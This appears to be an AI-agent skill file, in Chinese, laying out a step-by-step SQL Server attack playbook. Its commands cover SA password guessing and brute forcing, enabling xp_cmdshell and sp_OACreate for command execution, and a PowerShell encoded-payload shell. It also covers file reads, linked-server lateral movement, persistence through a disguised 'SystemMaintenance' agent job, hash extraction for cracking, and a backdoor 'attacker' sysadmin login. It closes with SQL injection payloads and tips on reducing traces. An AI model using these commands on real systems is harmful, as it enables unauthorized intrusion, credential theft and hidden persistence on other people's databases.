---
name: sqlserver-attack
description: "SQL Server 渗透测试与利用。当发现目标开放 1433 端口、SQL Server 允许远程连接（SA 弱口令）、需要从数据库提取数据或实现命令执行时使用。覆盖未授权访问、数据库枚举与导出、xp_cmdshell 命令执行、sp_OACreate COM 对象利用、BULK INSERT 文件读取、Linked Server 横向移动、SQL Agent Job 持久化、存储过程利用、用户创建与提权"
metadata:
  tags: "sqlserver,mssql,1433,sa,xp_cmdshell,sp_oacreate,linked-server,bulk-insert,sql-agent,存储过程"
  category: "exploit"
---

# SQL Server 渗透测试与利用

SQL Server 默认监听 1433 端口，SA 弱口令是最常见的入口点。一旦获得 sysadmin 权限，通过 xp_cmdshell 即可直接执行操作系统命令；即使 xp_cmdshell 被禁用，仍有 sp_OACreate、CLR Assembly、SQL Agent Job 等多条 RCE 路径。Linked Server 机制更是内网横向移动的重要跳板。

## 深入参考（必读）
- 完整利用命令和 payload -> 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: 服务发现

### 1.1 端口扫描与版本识别

```bash
# Nmap 版本探测
nmap -sV -p 1433 TARGET

# SQL Server 信息收集脚本
nmap -p 1433 --script ms-sql-info TARGET

# 探测 SQL Server Browser（UDP 1434，获取实例信息）
nmap -sU -p 1434 --script ms-sql-info TARGET
```

### 1.2 手动连接测试

```bash
# sqlcmd（微软官方客户端）
sqlcmd -S TARGET,1433 -U sa -P 'password' -Q "SELECT @@version;"

# mssqlclient.py（Impacket，渗透测试首选）
mssqlclient.py sa:'password'@TARGET -port 1433

# sqsh（Linux 原生客户端）
sqsh -S TARGET:1433 -U sa -P 'password'

# Windows 认证（当前域凭据）
sqlcmd -S TARGET -E -Q "SELECT @@version;"

# mssqlclient.py Windows 认证
mssqlclient.py DOMAIN/user:'password'@TARGET -windows-auth
```

**关键判断**：
- 返回版本信息 -> 已连接，进入 Phase 3
- 返回 `Login failed for user` -> 密码错误，进入 Phase 2
- 返回 `TCP Provider: Error` -> 网络不通或端口被防火墙拦截
- 返回版本号 -> 确定 SQL Server 版本（影响可用攻击路径）

---

## Phase 2: 认证检测

### 2.1 认证模式

```
SQL Server 认证模式（影响攻击路径）
├─ SQL Server 认证 — 用户名 + 密码（SA 弱口令最常见）
├─ Windows 认证 — 域凭据（NTLM/Kerberos）
└─ 混合模式 — 同时支持以上两种（最常见配置）
```

### 2.2 SA 弱口令检测

```bash
# 常见 SA 默认密码
sqlcmd -S TARGET -U sa -P '' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'sa' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P '123456' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'admin' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'Password1' -Q "SELECT 1;"

# Windows 认证（无需密码，使用当前凭据）
sqlcmd -S TARGET -E -Q "SELECT 1;"
```

### 2.3 暴力破解

```bash
# Hydra
hydra -l sa -P passwords.txt TARGET mssql

# Nmap
nmap -p 1433 --script ms-sql-brute TARGET

# Medusa
medusa -h TARGET -u sa -P passwords.txt -M mssql

# Metasploit
msf> use auxiliary/scanner/mssql/mssql_login
msf> set RHOSTS TARGET
msf> run
```

---

## Phase 3: 攻击决策树

```
已连接 SQL Server？
├─ 查询当前权限
│   SELECT SYSTEM_USER, USER_NAME();
│   SELECT IS_SRVROLEMEMBER('sysadmin');
│
├─ sysadmin (SA) 权限
│   ├─ xp_cmdshell 可启用 -> RCE (Phase 4.1)
│   ├─ xp_cmdshell 被禁且无法启用 -> sp_OACreate COM 对象 RCE (Phase 4.2)
│   ├─ 有 BULK INSERT 权限 -> 文件读取 (Phase 4.3)
│   ├─ 有 Linked Server -> 横向移动到其他 SQL Server (Phase 5.1)
│   ├─ 有 SQL Agent 权限 -> Job 持久化 (Phase 5.2)
│   ├─ CLR 集成可启用 -> CLR Assembly RCE (Phase 4.2)
│   └─ sys.sql_logins 可查 -> 凭据提取 (Phase 6.2)
│
├─ 普通数据库用户权限
│   ├─ information_schema 可查 -> 数据库枚举 (Phase 6.1)
│   ├─ IMPERSONATE 权限 -> 模拟其他用户提权
│   ├─ db_owner 角色 -> 通过 EXECUTE AS 提权
│   └─ 尝试提权 -> sp_addsrvrolemember (Phase 6.3)
│
└─ SQL 注入场景
    ├─ 堆叠注入可用 -> xp_cmdshell RCE
    ├─ UNION 注入 -> 数据提取
    ├─ 时间盲注 -> WAITFOR DELAY 探测
    └─ 报错注入 -> CONVERT 类型转换报错
```

### 前置信息收集

```bash
# 当前用户与权限
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT SYSTEM_USER, USER_NAME();"
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT IS_SRVROLEMEMBER('sysadmin');"

# SQL Server 版本
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT @@version;"

# 所有数据库
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT name FROM sys.databases;"

# 服务器配置（xp_cmdshell、OLE Automation 等是否启用）
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC sp_configure;"

# 检查 Linked Server
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC sp_linkedservers;"

# 检查 SQL Agent 状态
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT dss.status_desc FROM sys.dm_server_services dss WHERE servicename LIKE '%Agent%';"

# mssqlclient.py 交互式枚举
mssqlclient.py sa:'password'@TARGET
# 进入后执行：
# enum_db         — 列出数据库
# enum_logins     — 枚举登录账户
# enum_impersonate — 检查可模拟的用户
```

---

## Phase 4: RCE 速查

### 4.1 xp_cmdshell 命令执行（需 sysadmin）

```bash
# 启用 xp_cmdshell
sqlcmd -S TARGET -U sa -P 'password' -Q "
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# 执行系统命令
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC xp_cmdshell 'whoami';"
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC xp_cmdshell 'ipconfig';"

# 反弹 Shell（PowerShell）
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';"

# mssqlclient.py（自动启用 xp_cmdshell）
mssqlclient.py sa:'password'@TARGET
# 进入后执行：
# enable_xp_cmdshell
# xp_cmdshell whoami

# 用完后禁用（减少痕迹）
sqlcmd -S TARGET -U sa -P 'password' -Q "
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;"
```

### 4.2 sp_OACreate COM 对象 RCE（xp_cmdshell 被禁时的替代方案）

```bash
# 启用 OLE Automation
sqlcmd -S TARGET -U sa -P 'password' -Q "
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;"

# 通过 wscript.shell 执行命令
sqlcmd -S TARGET -U sa -P 'password' -Q "
DECLARE @shell INT;
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami > C:\temp\output.txt';"

# 通过 Scripting.FileSystemObject 写文件
sqlcmd -S TARGET -U sa -P 'password' -Q "
DECLARE @fs INT, @file INT;
EXEC sp_oacreate 'Scripting.FileSystemObject', @fs OUTPUT;
EXEC sp_oamethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\temp\payload.txt', 1;
EXEC sp_oamethod @file, 'Write', NULL, 'malicious content';
EXEC sp_oamethod @file, 'Close';"
```

### 4.3 BULK INSERT 文件读取

```bash
# 读取本地文件
sqlcmd -S TARGET -U sa -P 'password' -Q "
CREATE TABLE #tmp (line VARCHAR(MAX));
BULK INSERT #tmp FROM 'C:\Windows\System32\drivers\etc\hosts';
SELECT * FROM #tmp;
DROP TABLE #tmp;"

# OPENROWSET 读取文件
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS Contents;"
```

-> 更多方法与完整 payload -> 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 5: 横向移动与持久化速查

### 5.1 Linked Server 横向移动

```bash
# 列出所有 Linked Server
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC sp_linkedservers;"

# 通过 OPENQUERY 在远程服务器执行查询
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT @@servername; SELECT @@version;');"

# 通过 EXEC AT 在远程服务器执行命令（链式利用）
sqlcmd -S TARGET -U sa -P 'password' -Q "
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT LINKED_SERVER;
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT LINKED_SERVER;
EXEC ('EXEC xp_cmdshell ''whoami'';') AT LINKED_SERVER;"

# 嵌套 Linked Server（多跳横向移动）
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT * FROM OPENQUERY(SERVER_A, 'SELECT * FROM OPENQUERY(SERVER_B, ''SELECT @@servername'')');"
```

### 5.2 SQL Agent Job 持久化

```bash
# 创建持久化 Job
sqlcmd -S TARGET -U sa -P 'password' -Q "
USE msdb;
EXEC dbo.sp_add_job @job_name = 'SystemMaintenance';
EXEC dbo.sp_add_jobstep @job_name = 'SystemMaintenance',
    @step_name = 'step1',
    @subsystem = 'CmdExec',
    @command = 'powershell -e <BASE64_PAYLOAD>';
EXEC dbo.sp_add_jobserver @job_name = 'SystemMaintenance';
EXEC dbo.sp_start_job @job_name = 'SystemMaintenance';"

# 添加定时计划（每天执行）
sqlcmd -S TARGET -U sa -P 'password' -Q "
USE msdb;
EXEC dbo.sp_add_schedule @schedule_name = 'DailyRun',
    @freq_type = 4,
    @freq_interval = 1,
    @active_start_time = 010000;
EXEC dbo.sp_attach_schedule @job_name = 'SystemMaintenance',
    @schedule_name = 'DailyRun';"

# 列出现有 Job
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC msdb.dbo.sp_help_job;"
```

-> 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整技术细节

---

## Phase 6: 数据提取与提权

### 6.1 数据库枚举

```bash
# 列出所有数据库
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT name FROM sys.databases;"

# 列出指定数据库的所有表
sqlcmd -S TARGET -U sa -P 'password' -d DATABASE_NAME -Q "
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;"

# 搜索敏感表名
sqlcmd -S TARGET -U sa -P 'password' -d DATABASE_NAME -Q "
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_NAME LIKE '%password%' OR TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%credential%';"

# 搜索敏感列名
sqlcmd -S TARGET -U sa -P 'password' -d DATABASE_NAME -Q "
SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%password%' OR COLUMN_NAME LIKE '%secret%' OR COLUMN_NAME LIKE '%token%';"
```

### 6.2 凭据提取

```bash
# 提取 SQL Server 登录哈希（需 sysadmin）
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT name, password_hash FROM sys.sql_logins;"

# 列出所有服务器级登录
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT name, type_desc, is_disabled FROM sys.server_principals;"

# 列出 sysadmin 成员
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT name FROM sys.server_principals
WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;"
```

### 6.3 用户创建与提权

```bash
# 创建新登录并赋予 sysadmin
sqlcmd -S TARGET -U sa -P 'password' -Q "
CREATE LOGIN attacker WITH PASSWORD = 'P@ssw0rd!';
EXEC sp_addsrvrolemember 'attacker', 'sysadmin';"

# IMPERSONATE 提权（检查并利用模拟权限）
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT DISTINCT grantee_principal_id, name
FROM sys.server_permissions
JOIN sys.server_principals ON grantee_principal_id = principal_id
WHERE permission_name = 'IMPERSONATE';"

# 模拟 SA 执行命令
sqlcmd -S TARGET -U lowpriv -P 'password' -Q "
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
REVERT;"
```

---

## SQL 注入速查

```bash
# 版本探测
' UNION SELECT NULL,@@version--

# 当前用户
' UNION SELECT NULL,SYSTEM_USER--

# 数据库列表
' UNION SELECT NULL,name FROM master..sysdatabases--

# 表列表
' UNION SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--

# 时间盲注
'; WAITFOR DELAY '0:0:5'--

# 堆叠注入 + xp_cmdshell RCE（最高威胁）
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--

# 报错注入（提取数据）
' AND 1=CONVERT(int,(SELECT @@version))--

# 布尔盲注
' AND SUBSTRING(@@version,1,1)='M'--
```

---

## 工具速查

| 工具 | 用途 |
|------|------|
| sqlcmd | SQL Server 官方命令行客户端 |
| mssqlclient.py | Impacket 渗透测试客户端（推荐） |
| sqsh | Linux 原生 SQL Server 客户端 |
| PowerUpSQL | PowerShell SQL Server 审计与利用框架 |
| hydra / medusa | SQL Server 密码爆破 |
| nmap ms-sql-* | Nmap 内置 SQL Server 脚本集 |
| sqlmap | SQL 注入自动化检测与利用 |
| Metasploit | SQL Server 模块集合（登录/枚举/RCE） |

---

## 注意事项

- `xp_cmdshell` 启用后 SQL Server 日志会记录，操作完成后应立即禁用
- `sp_OACreate` 执行命令无直接回显，需通过写文件或外带方式获取输出
- Linked Server 横向移动时，远程服务器的权限取决于 Linked Server 配置的映射账户
- SQL Agent Job 需要 SQL Server Agent 服务处于运行状态
- BULK INSERT 要求 SQL Server 服务账户对文件有读取权限
- 云托管 SQL Server（Azure SQL/RDS）通常禁用 xp_cmdshell 和文件系统访问
- Windows 认证场景下，需先获取域凭据或在域内机器上操作
- `password_hash` 从 sys.sql_logins 提取后可用 hashcat 模式 1731 破解
